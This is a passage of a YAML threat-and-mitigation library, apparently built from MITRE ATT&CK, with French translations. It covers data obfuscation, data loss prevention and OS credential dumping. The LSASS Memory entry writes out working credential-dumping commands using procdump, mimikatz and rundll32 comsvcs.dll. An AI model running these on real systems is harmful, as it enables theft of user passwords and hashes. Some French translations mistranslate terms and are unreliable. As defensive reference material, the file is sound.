          \ de la configuration des tests :\n\n- Effectuer des modifications de configuration\
          \ dans un environnement de staging avant de les appliquer en production.\n\
          - Effectuer des audits r\xE9guliers afin de s\u2019assurer que les param\xE8\
          tres restent align\xE9s sur les politiques de s\xE9curit\xE9.\n\n*Outils\
          \ pour la mise en \u0153uvre*\n\nOutils de gestion de configuration :\n\n\
          - Ansible : Automatise les changements de configuration \xE0 travers plusieurs\
          \ applications et environnements.\n- Chef : Assure des param\xE8tres applicatifs\
          \ coh\xE9rents gr\xE2ce \xE0 une gestion de configuration bas\xE9e sur le\
          \ code.\n- Puppet : Automatise les configurations logicielles et audit les\
          \ modifications pour la conformit\xE9.\n\nOutils de benchmarking de s\xE9\
          curit\xE9 :\n\n- CIS-CAT : Fournit des benchmarks et des audits pour des\
          \ configurations logicielles s\xE9curis\xE9es.\n- Aqua Security Trivy :\
          \ Analyse les applications conteneuris\xE9es \xE0 la recherche de probl\xE8\
          mes de configuration.\n\nSolutions de gestion des vuln\xE9rabilit\xE9s :\n\
          \n- Nessus : Identifie les erreurs de configuration et sugg\xE8re des actions\
          \ correctives.\n\nOutils de journalisation et de surveillance :\n\n- Splunk\
          \ : Agr\xE9ge et analyse les journaux d\u2019application pour d\xE9tecter\
          \ toute activit\xE9 suspecte.\nhttps://attack.mitre.org/mitigations/M1054"
  - urn: urn:intuitem:risk:function:mitre-attack:m1055
    ref_id: M1055
    name: Do Not Mitigate
    category: technical
    csf_function: govern
    description: "The Do Not Mitigate category highlights scenarios where attempting\
      \ to mitigate a specific technique may inadvertently increase the organization's\
      \ security risk or operational instability. This could happen due to the complexity\
      \ of the system, the integration of critical processes, or the potential for\
      \ introducing new vulnerabilities. Instead of direct mitigation, these situations\
      \ may call for alternative strategies such as detection, monitoring, or response.\
      \ The Do Not Mitigate category underscores the importance of assessing the trade-offs\
      \ between mitigation efforts and overall system integrity. This mitigation can\
      \ be implemented through the following measures:\n\nComplex Systems Where Mitigation\
      \ is Risky:\n\n- Interpretation: In certain systems, direct mitigation could\
      \ introduce new risks, especially if the system is highly interconnected or\
      \ complex, such as in legacy industrial control systems (ICS). Patching or modifying\
      \ these systems could result in unplanned downtime, disruptions, or even safety\
      \ risks.\n- Use Case: In a power grid control system, attempting to patch or\
      \ disable certain services related to device communications might disrupt critical\
      \ operations, leading to unintended service outages.\n\nRisk of Reducing Security\
      \ Coverage:\n\n- Interpretation: In some cases, mitigating a technique might\
      \ reduce the visibility or effectiveness of other security controls, limiting\
      \ an organization\u2019s ability to detect broader attacks.\n- Use Case: Disabling\
      \ script execution on a web server to mitigate potential PowerShell-based attacks\
      \ could interfere with legitimate administrative operations that rely on scripting,\
      \ while attackers may still find alternate ways to execute code.\n\nIntroduction\
      \ of New Vulnerabilities:\n\n- Interpretation: In highly sensitive or tightly\
      \ controlled environments, implementing certain mitigations might create vulnerabilities\
      \ in other parts of the system. For instance, disabling default security mechanisms\
      \ in an attempt to resolve compatibility issues may open the system to exploitation.\n\
      - Use Case: Disabling certificate validation to resolve internal communication\
      \ issues in a secure environment could lead to man-in-the-middle attacks, creating\
      \ a greater vulnerability than the original problem.\n\nNegative Impact on Performance\
      \ and Availability:\n\n- Interpretation: Mitigations that involve removing or\
      \ restricting system functionalities can have unintended consequences for system\
      \ performance and availability. Some mitigations, while effective at blocking\
      \ certain attacks, may introduce performance bottlenecks or compromise essential\
      \ operations.\n- Use Case: Implementing high levels of encryption to mitigate\
      \ data theft might result in significant performance degradation in systems\
      \ handling large volumes of real-time transactions.\nhttps://attack.mitre.org/mitigations/M1055"
    translations:
      fr:
        name: "Ne pas att\xE9nuer"
        description: "La cat\xE9gorie Ne pas att\xE9nuer met en lumi\xE8re des sc\xE9\
          narios o\xF9 tenter de limiter une technique sp\xE9cifique peut involontairement\
          \ augmenter le risque de s\xE9curit\xE9 de l\u2019organisation ou son instabilit\xE9\
          \ op\xE9rationnelle. Cela peut se produire en raison de la complexit\xE9\
          \ du syst\xE8me, de l\u2019int\xE9gration de processus critiques ou du risque\
          \ d\u2019introduction de nouvelles vuln\xE9rabilit\xE9s. Au lieu d\u2019\
          une att\xE9nuation directe, ces situations peuvent n\xE9cessiter des strat\xE9\
          gies alternatives telles que la d\xE9tection, la surveillance ou la r\xE9\
          ponse. La cat\xE9gorie Ne pas att\xE9nuer souligne l\u2019importance d\u2019\
          \xE9valuer les compromis entre les efforts d\u2019att\xE9nuation et l\u2019\
          int\xE9grit\xE9 globale du syst\xE8me. Cette att\xE9nuation peut \xEAtre\
          \ mise en \u0153uvre par les mesures suivantes :\n\nSyst\xE8mes complexes\
          \ o\xF9 l\u2019att\xE9nuation est risqu\xE9e :\n\n- Interpr\xE9tation :\
          \ Dans certains syst\xE8mes, l\u2019att\xE9nuation directe peut introduire\
          \ de nouveaux risques, en particulier si le syst\xE8me est tr\xE8s interconnect\xE9\
          \ ou complexe, comme dans les syst\xE8mes de contr\xF4le industriel (ICS)\
          \ h\xE9rit\xE9s. Corriger ou modifier ces syst\xE8mes pourrait entra\xEE\
          ner des interruptions impr\xE9vues, des perturbations, voire des risques\
          \ pour la s\xE9curit\xE9.\n- Cas d\u2019utilisation : Dans un syst\xE8me\
          \ de contr\xF4le du r\xE9seau \xE9lectrique, tenter de patcher ou de d\xE9\
          sactiver certains services li\xE9s aux communications des appareils peut\
          \ perturber des op\xE9rations critiques, entra\xEEnant des coupures de service\
          \ inattendues.\n\nRisque de r\xE9duction de la couverture s\xE9curit\xE9\
          \ :\n\n- Interpr\xE9tation : Dans certains cas, att\xE9nuer une technique\
          \ peut r\xE9duire la visibilit\xE9 ou l\u2019efficacit\xE9 d\u2019autres\
          \ contr\xF4les de s\xE9curit\xE9, limitant ainsi la capacit\xE9 d\u2019\
          une organisation \xE0 d\xE9tecter des attaques plus larges.\n- Cas d\u2019\
          utilisation : D\xE9sactiver l\u2019ex\xE9cution de scripts sur un serveur\
          \ web pour att\xE9nuer d\u2019\xE9ventuelles attaques bas\xE9es sur PowerShell\
          \ pourrait interf\xE9rer avec des op\xE9rations administratives l\xE9gitimes\
          \ reposant sur le scripting, tandis que les attaquants peuvent encore trouver\
          \ d\u2019autres moyens d\u2019ex\xE9cuter du code.\n\nIntroduction de nouvelles\
          \ vuln\xE9rabilit\xE9s :\n\n- Interpr\xE9tation : Dans des environnements\
          \ tr\xE8s sensibles ou strictement contr\xF4l\xE9s, la mise en \u0153uvre\
          \ de certaines mesures d\u2019att\xE9nuation peut cr\xE9er des vuln\xE9\
          rabilit\xE9s dans d\u2019autres parties du syst\xE8me. Par exemple, d\xE9\
          sactiver les m\xE9canismes de s\xE9curit\xE9 par d\xE9faut dans le but de\
          \ r\xE9soudre les probl\xE8mes de compatibilit\xE9 peut exposer le syst\xE8\
          me \xE0 l\u2019exploitation.\n- Cas d\u2019utilisation : D\xE9sactiver la\
          \ validation des certificats pour r\xE9soudre des probl\xE8mes de communication\
          \ interne dans un environnement s\xE9curis\xE9 pourrait entra\xEEner des\
          \ attaques d\u2019homme du milieu, cr\xE9ant une vuln\xE9rabilit\xE9 plus\
          \ grande que le probl\xE8me initial.\n\nImpact n\xE9gatif sur la performance\
          \ et la disponibilit\xE9 :\n\n- Interpr\xE9tation : Les att\xE9nuations\
          \ impliquant la suppression ou la restriction des fonctionnalit\xE9s du\
          \ syst\xE8me peuvent avoir des cons\xE9quences impr\xE9vues sur la performance\
          \ et la disponibilit\xE9 du syst\xE8me. Certaines mesures d\u2019att\xE9\
          nuation, bien qu\u2019efficaces pour bloquer certaines attaques, peuvent\
          \ introduire des goulets d\u2019\xE9tranglement de performance ou compromettre\
          \ les op\xE9rations essentielles.\n- Cas d\u2019utilisation : Mettre en\
          \ place des niveaux \xE9lev\xE9s de chiffrement pour att\xE9nuer le vol\
          \ de donn\xE9es peut entra\xEEner une d\xE9gradation significative des performances\
          \ dans les syst\xE8mes g\xE9rant de grands volumes de transactions en temps\
          \ r\xE9el.\nhttps://attack.mitre.org/mitigations/M1055"
  - urn: urn:intuitem:risk:function:mitre-attack:m1056
    ref_id: M1056
    name: Pre-compromise
    category: technical
    csf_function: govern
    description: 'Pre-compromise mitigations involve proactive measures and defenses
      implemented to prevent adversaries from successfully identifying and exploiting
      weaknesses during the Reconnaissance and Resource Development phases of an attack.
      These activities focus on reducing an organization''s attack surface, identify
      adversarial preparation efforts, and increase the difficulty for attackers to
      conduct successful operations. This mitigation can be implemented through the
      following measures:


      Limit Information Exposure:


      - Regularly audit and sanitize publicly available data, including job posts,
      websites, and social media.

      - Use tools like OSINT monitoring platforms (e.g., SpiderFoot, Recon-ng) to
      identify leaked information.


      Protect Domain and DNS Infrastructure:


      - Enable DNSSEC and use WHOIS privacy protection.

      - Monitor for domain hijacking or lookalike domains using services like RiskIQ
      or DomainTools.


      External Monitoring:


      - Use tools like Shodan, Censys to monitor your external attack surface.

      - Deploy external vulnerability scanners to proactively address weaknesses.


      Threat Intelligence:


      - Leverage platforms like MISP, Recorded Future, or Anomali to track adversarial
      infrastructure, tools, and activity.


      Content and Email Protections:


      - Use email security solutions like Proofpoint, Microsoft Defender for Office
      365, or Mimecast.

      - Enforce SPF/DKIM/DMARC policies to protect against email spoofing.


      Training and Awareness:


      - Educate employees on identifying phishing attempts, securing their social
      media, and avoiding information leaks.

      https://attack.mitre.org/mitigations/M1056'
    translations:
      fr:
        name: Avant le compromis
        description: "Les mesures d\u2019att\xE9nuation pr\xE9alables au compromis\
          \ impliquent des mesures proactives et des d\xE9fenses mises en place pour\
          \ emp\xEAcher les adversaires d\u2019identifier et d\u2019exploiter avec\
          \ succ\xE8s les faiblesses lors des phases de reconnaissance et de d\xE9\
          veloppement des ressources d\u2019une attaque. Ces activit\xE9s visent \xE0\
          \ r\xE9duire la surface d\u2019attaque d\u2019une organisation, \xE0 identifier\
          \ les efforts de pr\xE9paration adverses et \xE0 augmenter la difficult\xE9\
          \ des attaquants \xE0 mener des op\xE9rations avec succ\xE8s. Cette att\xE9\
          nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes :\n\n\
          Limitez l\u2019exposition \xE0 l\u2019information :\n\n- Auditer et d\xE9\
          sinfecter r\xE9guli\xE8rement les donn\xE9es publiques, y compris les offres\
          \ d\u2019emploi, les sites web et les r\xE9seaux sociaux.\n- Utiliser des\
          \ outils comme les plateformes de surveillance OSINT (par exemple, SpiderFoot,\
          \ Recon-ng) pour identifier les informations fuit\xE9es.\n\nProt\xE9ger\
          \ le domaine et l\u2019infrastructure DNS :\n\n- Activer DNSSEC et utiliser\
          \ la protection de la vie priv\xE9e WHOIS.\n- Surveiller les d\xE9tournements\
          \ de domaines ou les domaines similaires via des services tels que RiskIQ\
          \ ou DomainTools.\n\nSurveillance externe :\n\n- Utilisez des outils comme\
          \ Shodan, Censys pour surveiller votre surface d\u2019attaque externe.\n\
          - D\xE9ployer des scanners de vuln\xE9rabilit\xE9s externes pour corriger\
          \ de mani\xE8re proactive les faiblesses.\n\nRenseignement sur les menaces\
          \ :\n\n- Exploiter des plateformes telles que MISP, Recorded Future ou Anomali\
          \ pour suivre les infrastructures, outils et activit\xE9s adverses.\n\n\
          Protection du contenu et des e-mails :\n\n- Utiliser des solutions de s\xE9\
          curit\xE9 des e-mails telles que Proofpoint, Microsoft Defender for Office\
          \ 365 ou Mimecast.\n- Faire respecter les politiques SPF/DKIM/DMARC pour\
          \ se prot\xE9ger contre l\u2019usurpation d\u2019e-mail.\n\nFormation et\
          \ sensibilisation :\n\n- Former les employ\xE9s \xE0 l\u2019identification\
          \ des tentatives de phishing, \xE0 la s\xE9curit\xE9 de leurs r\xE9seaux\
          \ sociaux et \xE0 la pr\xE9vention des fuites d\u2019informations.\nhttps://attack.mitre.org/mitigations/M1056"
  - urn: urn:intuitem:risk:function:mitre-attack:m1057
    ref_id: M1057
    name: Data Loss Prevention
    category: technical
    csf_function: detect
    description: 'Data Loss Prevention (DLP) involves implementing strategies and
      technologies to identify, categorize, monitor, and control the movement of sensitive
      data within an organization. This includes protecting data formats indicative
      of Personally Identifiable Information (PII), intellectual property, or financial
      data from unauthorized access, transmission, or exfiltration. DLP solutions
      integrate with network, endpoint, and cloud platforms to enforce security policies
      and prevent accidental or malicious data leaks. (Citation: PurpleSec Data Loss
      Prevention) This mitigation can be implemented through the following measures:


      Sensitive Data Categorization:


      - Use Case: Identify and classify data based on sensitivity (e.g., PII, financial
      data, trade secrets).

      - Implementation: Use DLP solutions to scan and tag files containing sensitive
      information using predefined patterns, such as Social Security Numbers or credit
      card details.


      Exfiltration Restrictions:


      - Use Case: Prevent unauthorized transmission of sensitive data.

      - Implementation: Enforce policies to block unapproved email attachments, unauthorized
      USB usage, or unencrypted data uploads to cloud storage.


      Data-in-Transit Monitoring:


      - Use Case: Detect and prevent the transmission of sensitive data over unapproved
      channels.

      - Implementation: Deploy network-based DLP tools to inspect outbound traffic
      for sensitive content (e.g., financial records or PII) and block unapproved
      transmissions.


      Endpoint Data Protection:


      - Use Case: Monitor and control sensitive data usage on endpoints.

      - Implementation: Use endpoint-based DLP agents to block copy-paste actions
      of sensitive data and unauthorized printing or file sharing.


      Cloud Data Security:


      - Use Case: Protect data stored in cloud platforms.

      - Implementation: Integrate DLP with cloud storage platforms like Google Drive,
      OneDrive, or AWS to monitor and restrict sensitive data sharing or downloads.

      https://attack.mitre.org/mitigations/M1057'
    translations:
      fr:
        name: "Pr\xE9vention de la perte de donn\xE9es"
        description: "La pr\xE9vention des pertes de donn\xE9es (DLP) consiste \xE0\
          \ mettre en \u0153uvre des strat\xE9gies et des technologies pour identifier,\
          \ cat\xE9goriser, surveiller et contr\xF4ler le mouvement des donn\xE9es\
          \ sensibles au sein d\u2019une organisation. Cela inclut la protection des\
          \ formats de donn\xE9es indiquant des informations personnelles identifiables\
          \ (PII), de la propri\xE9t\xE9 intellectuelle ou des donn\xE9es financi\xE8\
          res contre l\u2019acc\xE8s non autoris\xE9, la transmission ou l\u2019exfiltration.\
          \ Les solutions DLP s\u2019int\xE8grent avec les plateformes r\xE9seau,\
          \ terminaux et cloud pour faire respecter les politiques de s\xE9curit\xE9\
          \ et pr\xE9venir les fuites de donn\xE9es accidentelles ou malveillantes.\
          \ (Citation : Pr\xE9vention de la perte de donn\xE9es PurpleSec) Cette att\xE9\
          nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes :\n\n\
          Cat\xE9gorisation des donn\xE9es sensibles :\n\n- Cas d\u2019utilisation\
          \ : Identifier et classer les donn\xE9es en fonction de la sensibilit\xE9\
          \ (par exemple, PII, donn\xE9es financi\xE8res, secrets commerciaux).\n\
          - Mise en \u0153uvre : Utiliser des solutions DLP pour scanner et \xE9tiqueter\
          \ des fichiers contenant des informations sensibles \xE0 l\u2019aide de\
          \ sch\xE9mas pr\xE9d\xE9finis, tels que les num\xE9ros de s\xE9curit\xE9\
          \ sociale ou les d\xE9tails de carte bancaire.\n\nRestrictions d\u2019exfiltration\
          \ :\n\n- Cas d\u2019utilisation : Emp\xEAcher la transmission non autoris\xE9\
          e de donn\xE9es sensibles.\n- Mise en \u0153uvre : Appliquer des politiques\
          \ de blocage des pi\xE8ces jointes non approuv\xE9es par e-mail, des utilisations\
          \ USB non autoris\xE9es ou des t\xE9l\xE9chargements de donn\xE9es non chiffr\xE9\
          es vers le stockage cloud.\n\nSurveillance des donn\xE9es en transit :\n\
          \n- Cas d\u2019utilisation : D\xE9tecter et emp\xEAcher la transmission\
          \ de donn\xE9es sensibles via des canaux non approuv\xE9s.\n- Mise en \u0153\
          uvre : d\xE9ployer des outils DLP bas\xE9s sur le r\xE9seau pour inspecter\
          \ le trafic sortant \xE0 la recherche de contenus sensibles (par exemple,\
          \ dossiers financiers ou PII) et bloquer les transmissions non approuv\xE9\
          es.\n\nProtection des donn\xE9es des points de terminaison :\n\n- Cas d\u2019\
          utilisation : Surveiller et contr\xF4ler l\u2019utilisation de donn\xE9\
          es sensibles sur les points de terminaison.\n- Mise en \u0153uvre : Utiliser\
          \ des agents DLP bas\xE9s sur les points de terminaison pour bloquer les\
          \ actions de copier-coller des donn\xE9es sensibles ainsi que l\u2019impression\
          \ ou le partage de fichiers non autoris\xE9s.\n\nS\xE9curit\xE9 des donn\xE9\
          es cloud :\n\n- Cas d\u2019utilisation : Prot\xE9ger les donn\xE9es stock\xE9\
          es sur les plateformes cloud.\n- Mise en \u0153uvre : Int\xE9grer le DLP\
          \ avec des plateformes de stockage cloud telles que Google Drive, OneDrive\
          \ ou AWS pour surveiller et restreindre le partage ou le t\xE9l\xE9chargement\
          \ de donn\xE9es sensibles.\nhttps://attack.mitre.org/mitigations/M1057"
  - urn: urn:intuitem:risk:function:mitre-attack:m1060
    ref_id: M1060
    name: Out-of-Band Communications Channel
    category: technical
    csf_function: protect
    description: 'Establish secure out-of-band communication channels to ensure the
      continuity of critical communications during security incidents, data integrity
      attacks, or in-network communication failures. Out-of-band communication refers
      to using an alternative, separate communication path that is not dependent on
      the potentially compromised primary network infrastructure. This method can
      include secure messaging apps, encrypted phone lines, satellite communications,
      or dedicated emergency communication systems. Leveraging these alternative channels
      reduces the risk of adversaries intercepting, disrupting, or tampering with
      sensitive communications and helps coordinate an effective incident response.(Citation:
      TrustedSec OOB Communications)(Citation: NIST Special Publication 800-53 Revision
      5)

      https://attack.mitre.org/mitigations/M1060'
    translations:
      fr:
        name: Canal de communication hors bande
        description: "\xC9tablir des canaux de communication hors bande s\xE9curis\xE9\
          s afin d\u2019assurer la continuit\xE9 des communications critiques lors\
          \ d\u2019incidents de s\xE9curit\xE9, d\u2019attaques contre l\u2019int\xE9\
          grit\xE9 des donn\xE9es ou de d\xE9faillances de communication en r\xE9\
          seau. La communication hors bande fait r\xE9f\xE9rence \xE0 l\u2019utilisation\
          \ d\u2019un chemin de communication alternatif et s\xE9par\xE9, qui ne d\xE9\
          pend pas de l\u2019infrastructure r\xE9seau principale potentiellement compromise.\
          \ Cette m\xE9thode peut inclure des applications de messagerie s\xE9curis\xE9\
          es, des lignes t\xE9l\xE9phoniques chiffr\xE9es, des communications satellites\
          \ ou des syst\xE8mes de communication d\u2019urgence d\xE9di\xE9s. L\u2019\
          utilisation de ces canaux alternatifs r\xE9duit le risque que les adversaires\
          \ interceptent, perturbent ou manipulent des communications sensibles et\
          \ aide \xE0 coordonner une r\xE9ponse efficace aux incidents. (Citation\
          \ : TrustedSec OOB Communications)(Citation : Publication sp\xE9ciale NIST\
          \ 800-53 R\xE9vision 5)\nhttps://attack.mitre.org/mitigations/M1060"
  threats:
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001
    ref_id: T1001
    name: Data Obfuscation
    description: 'Adversaries may obfuscate command and control traffic to make it
      more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November
      2020) Command and control (C2) communications are hidden (but not necessarily
      encrypted) in an attempt to make the content more difficult to discover or decipher
      and to make the communication less conspicuous and hide commands from being
      seen. This encompasses many methods, such as adding junk data to protocol traffic,
      using steganography, or impersonating legitimate protocols.

      https://attack.mitre.org/techniques/T1001'
    translations:
      fr:
        name: "Obfuscation des donn\xE9es"
        description: "Les adversaires peuvent obscurcir le trafic de commandement\
          \ et de contr\xF4le afin de le rendre plus difficile \xE0 d\xE9tecter. (Citation\
          \ : Campagne Bitdefender FunnyDream novembre 2020) Les communications de\
          \ commandement et de contr\xF4le (C2) sont cach\xE9es (mais pas n\xE9cessairement\
          \ chiffr\xE9es) dans le but de rendre le contenu plus difficile \xE0 d\xE9\
          couvrir ou \xE0 d\xE9chiffrer, de rendre la communication moins visible\
          \ et de dissimuler les commandes d\u2019\xEAtre visibles. Cela englobe de\
          \ nombreuses m\xE9thodes, telles que l\u2019ajout de donn\xE9es inutilisables\
          \ au trafic de protocoles, l\u2019utilisation de st\xE9ganographie ou l\u2019\
          usurpation d\u2019identit\xE9 de protocoles l\xE9gitimes.\nhttps://attack.mitre.org/techniques/T1001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001.001
    ref_id: T1001.001
    name: Junk Data
    description: 'Adversaries may add junk data to protocols used for command and
      control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor
      December 2020) By adding random or meaningless data to the protocols used for
      command and control, adversaries can prevent trivial methods for decoding, deciphering,
      or otherwise analyzing the traffic. Examples may include appending/prepending
      data with junk characters or writing junk characters between significant characters.

      https://attack.mitre.org/techniques/T1001/001'
    translations:
      fr:
        name: "Donn\xE9es inutilisables"
        description: "Les adversaires peuvent ajouter des donn\xE9es inutiles aux\
          \ protocoles utilis\xE9s pour le commandement et le contr\xF4le afin de\
          \ rendre la d\xE9tection plus difficile. (Citation : FireEye SUNBURST Backdoor\
          \ d\xE9cembre 2020) En ajoutant des donn\xE9es al\xE9atoires ou d\xE9nu\xE9\
          es de sens aux protocoles utilis\xE9s pour le commandement et le contr\xF4\
          le, les adversaires peuvent emp\xEAcher des m\xE9thodes triviales de d\xE9\
          codage, de d\xE9chiffrement ou d\u2019analyse du trafic. Des exemples peuvent\
          \ inclure l\u2019ajout ou la pr\xE9-ajout de donn\xE9es avec des caract\xE8\
          res ind\xE9sirables ou l\u2019\xE9criture de caract\xE8res inutilisables\
          \ entre des caract\xE8res significatifs.\nhttps://attack.mitre.org/techniques/T1001/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001.002
    ref_id: T1001.002
    name: Steganography
    description: 'Adversaries may use steganographic techniques to hide command and
      control traffic to make detection efforts more difficult. Steganographic techniques
      can be used to hide data in digital messages that are transferred between systems.
      This hidden information can be used for command and control of compromised systems.
      In some cases, the passing of files embedded using steganography, such as image
      or document files, can be used for command and control.

      https://attack.mitre.org/techniques/T1001/002'
    translations:
      fr:
        name: "St\xE9ganographie"
        description: "Les adversaires peuvent utiliser des techniques st\xE9ganographiques\
          \ pour dissimuler le commandement et contr\xF4ler le trafic afin de rendre\
          \ les efforts de d\xE9tection plus difficiles. Les techniques st\xE9ganographiques\
          \ peuvent \xEAtre utilis\xE9es pour masquer des donn\xE9es dans les messages\
          \ num\xE9riques transf\xE9r\xE9s entre syst\xE8mes. Ces informations cach\xE9\
          es peuvent \xEAtre utilis\xE9es pour le commandement et le contr\xF4le de\
          \ syst\xE8mes compromis. Dans certains cas, le transfert de fichiers int\xE9\
          gr\xE9s via st\xE9ganographie, comme des fichiers image ou document, peut\
          \ \xEAtre utilis\xE9 pour le commandement et le contr\xF4le.\nhttps://attack.mitre.org/techniques/T1001/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001.003
    ref_id: T1001.003
    name: Protocol or Service Impersonation
    description: "Adversaries may impersonate legitimate protocols or web service\
      \ traffic to disguise command and control activity and thwart analysis efforts.\
      \ By impersonating legitimate protocols or web services, adversaries can make\
      \ their command and control traffic blend in with legitimate network traffic.\
      \  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look\
      \ like subsequent traffic is SSL/TLS encrypted, potentially interfering with\
      \ some security tooling, or to make the traffic look like it is related with\
      \ a trusted entity. \n\nAdversaries may also leverage legitimate protocols to\
      \ impersonate expected web traffic or trusted services. For example, adversaries\
      \ may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted\
      \ data to disguise C2 communications or mimic legitimate services such as Gmail,\
      \ Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation:\
      \ Malleable-C2-U42)\nhttps://attack.mitre.org/techniques/T1001/003"
    translations:
      fr:
        name: Usurpation de protocole ou de service
        description: "Les adversaires peuvent se faire passer pour des protocoles\
          \ l\xE9gitimes ou du trafic de services web pour dissimuler une activit\xE9\
          \ de commandement et de contr\xF4le et contrecarrer les efforts d\u2019\
          analyse. En usurpant l\u2019identit\xE9 de protocoles ou de services web\
          \ l\xE9gitimes, les adversaires peuvent faire en sorte que leur trafic de\
          \ commandement et de contr\xF4le se fonde dans le trafic r\xE9seau l\xE9\
          gitime.  \n\nLes adversaires peuvent se faire passer pour une fausse poign\xE9\
          e de main SSL/TLS pour faire croire que le trafic ult\xE9rieur est chiffr\xE9\
          \ par SSL/TLS, ce qui pourrait interf\xE9rer avec certains outils de s\xE9\
          curit\xE9, ou pour faire croire que le trafic est li\xE9 \xE0 une entit\xE9\
          \ de confiance. \n\nLes adversaires peuvent \xE9galement utiliser des protocoles\
          \ l\xE9gitimes pour se faire passer pour le trafic web attendu ou des services\
          \ de confiance. Par exemple, les adversaires peuvent manipuler les en-t\xEA\
          tes HTTP, les points d\u2019acc\xE8s URI, les certificats SSL et les donn\xE9\
          es transmises pour dissimuler des communications C2 ou imiter des services\
          \ l\xE9gitimes tels que Gmail, Google Drive et Yahoo Messenger. (Citation\
          \ : ESET Okrum juillet 2019)(Citation : Mall\xE9able-C2-U42)\nhttps://attack.mitre.org/techniques/T1001/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003
    ref_id: T1003
    name: OS Credential Dumping
    description: 'Adversaries may attempt to dump credentials to obtain account login
      and credential material, normally in the form of a hash or a clear text password.
      Credentials can be obtained from OS caches, memory, or structures.(Citation:
      Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      and access restricted information.


      Several of the tools mentioned in associated sub-techniques may be used by both
      adversaries and professional security testers. Additional custom tools likely
      exist as well.

      https://attack.mitre.org/techniques/T1003'
    translations:
      fr:
        name: "Dumping des cr\xE9dentials OS"
        description: "Les adversaires peuvent tenter de supprimer des identifiants\
          \ pour obtenir des identifiants de compte et du mat\xE9riel de r\xE9f\xE9\
          rence, g\xE9n\xE9ralement sous forme de hachage ou de mot de passe en texte\
          \ clair. Les identifiants peuvent \xEAtre obtenus \xE0 partir de caches,\
          \ de m\xE9moire ou de structures du syst\xE8me d\u2019exploitation. (Citation\
          \ : Apporter MimiKatz \xE0 Unix) Les identifiants peuvent alors \xEAtre\
          \ utilis\xE9s pour effectuer un [Mouvement Lat\xE9ral](https://attack.mitre.org/tactics/TA0008)\
          \ et acc\xE9der \xE0 des informations restreintes.\n\nPlusieurs des outils\
          \ mentionn\xE9s dans les sous-techniques associ\xE9es peuvent \xEAtre utilis\xE9\
          s \xE0 la fois par des adversaires et des testeurs de s\xE9curit\xE9 professionnels.\
          \ D\u2019autres outils personnalis\xE9s existent probablement \xE9galement.\n\
          https://attack.mitre.org/techniques/T1003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.001
    ref_id: T1003.001
    name: LSASS Memory
    description: 'Adversaries may attempt to access credential material stored in
      the process memory of the Local Security Authority Subsystem Service (LSASS).
      After a user logs on, the system generates and stores a variety of credential
      materials in LSASS process memory. These credential materials can be harvested
      by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).


      As well as in-memory techniques, the LSASS process memory can be dumped from
      the target host and analyzed on a local system.


      For example, on the target host use procdump:


      * <code>procdump -ma lsass.exe lsass_dump</code>


      Locally, mimikatz can be run using:


      * <code>sekurlsa::Minidump lsassdump.dmp</code>

      * <code>sekurlsa::logonPasswords</code>


      Built-in Windows tools such as `comsvcs.dll` can also be used:


      * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp
      full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec
      Attacks Against Government Sector)


      Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012),
      the silent process exit mechanism can be abused to create a memory dump of `lsass.exe`
      through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)


      Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at
      system start. Once loaded into the LSA, SSP DLLs have access to encrypted and
      plaintext passwords that are stored in Windows, such as any logged-on user''s
      Domain password or smart card PINs. The SSP configuration is stored in two Registry
      keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>
      and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>.
      An adversary may modify these Registry keys to add new SSPs, which will be loaded
      the next time the system boots, or when the AddSecurityPackage Windows API function
      is called.(Citation: Graeber 2014)


      The following SSPs can be used to access credentials:


      * Msv: Interactive logons, batch logons, and service logons are done through
      the MSV authentication package.

      * Wdigest: The Digest Authentication protocol is designed for use with Hypertext
      Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation:
      TechNet Blogs Credential Protection)

      * Kerberos: Preferred for mutual client-server domain authentication in Windows
      2000 and later.

      * CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop
      Services.(Citation: TechNet Blogs Credential Protection)

      https://attack.mitre.org/techniques/T1003/001'
    translations:
      fr:
        name: "M\xE9moire LSASS"
        description: "Les adversaires peuvent tenter d\u2019acc\xE9der au mat\xE9\
          riel de certification stock\xE9 dans la m\xE9moire de processus du Service\
          \ du sous-syst\xE8me de l\u2019autorit\xE9 locale de s\xE9curit\xE9 (LSASS).\
          \ Apr\xE8s la connexion de l\u2019utilisateur, le syst\xE8me g\xE9n\xE8\
          re et stocke divers documents d\u2019identifiants dans la m\xE9moire des\
          \ processus LSASS. Ces documents d\u2019accr\xE9ditation peuvent \xEAtre\
          \ collect\xE9s par un utilisateur administratif ou un SYST\xC8ME et utilis\xE9\
          s pour effectuer un [Mouvement Lat\xE9ral](https://attack.mitre.org/tactics/TA0008)\
          \ \xE0 l\u2019aide de [Utiliser le Mat\xE9riel d\u2019Authentification Alternatif](https://attack.mitre.org/techniques/T1550).\n\
          \nEn plus des techniques en m\xE9moire, la m\xE9moire du processus LSASS\
          \ peut \xEAtre extraite de l\u2019h\xF4te cible et analys\xE9e sur un syst\xE8\
          me local.\n\nPar exemple, sur l\u2019h\xF4te cible, utilisez le d\xE9bit\
          \ de procdumping :\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\
